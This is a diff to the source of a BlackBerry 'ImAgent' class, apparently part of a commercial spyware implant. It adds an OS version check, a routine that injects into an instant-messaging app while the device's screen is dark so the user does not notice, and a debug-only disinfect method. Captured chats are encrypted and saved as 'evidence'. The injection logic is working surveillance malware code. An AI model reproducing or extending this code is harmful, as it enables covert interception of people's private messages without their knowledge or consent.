@@ -14,6 +14,7 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.AppListener;
+import blackberry.Device;
 import blackberry.agent.im.LineMarkup;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
@@ -55,6 +56,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
     public ImAgent(final boolean agentEnabled) {
         super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");
 
+        if(!Device.getInstance().atLeast(5, 0)){
+            //#ifdef DEBUG
+            debug.error("ImAgent: not supported before OS 5.0");
+            //#endif
+            enable(false);
+        }
+        
         //#ifdef IM_FORCED
         enable(true);
         //#endif
@@ -79,7 +87,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         markup = new LineMarkup(agentId, Encryption.getKeys().getAesKey());
 
     }
-
+    
     private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
         debug.trace("unserialize");
@@ -132,6 +140,14 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#ifdef DEBUG
             debug.error("actualStart: " + ex);
             //#endif
+        }
+        
+        if (!Backlight.isEnabled() && !appInjector.isInfected()) {
+            //#ifdef DEBUG
+            debug.info("injecting");
+            //#endif
+
+            appInjector.infect();
         }
     }
 
@@ -305,5 +321,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
         evidence.atomicWriteOnce(items);
 
     }
+    
+    //#ifdef DEBUG
+    public void disinfect(){
+        if(appInjector!=null){
+            appInjector.disinfect();
+        }
+    }
+    //#endif
 
 }
